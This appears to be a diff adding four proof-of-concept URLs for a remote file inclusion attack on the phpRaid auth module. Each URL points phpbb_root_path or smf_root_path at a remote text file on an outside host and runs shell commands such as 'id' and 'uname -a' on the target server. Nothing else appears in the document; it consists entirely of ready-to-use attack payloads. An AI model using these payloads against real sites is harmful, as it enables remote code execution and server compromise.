@@ -1,0 +1,4 @@
+http://www.example.com/[phpraidpath]/auth/auth.php?phpbb_root_path=http://www.example2.com/x.txt?&amp;cmd=id
+http://www.example.com/[phpraidpath]/auth/auth_phpbb/phpbb_root_path=http://www.example2.com/x.txt?&amp;cmd=uname -a
+http://www.example.com/[phpraidpath]/auth/auth.php?smf_root_path=http://www.example2.com/x.txt?&amp;cmd=id
+http://www.example.com/[phpraidpath]/auth/auth_SMF/smf_root_path=http://www.example2.com/x.txt?&amp;cmd=uname -a
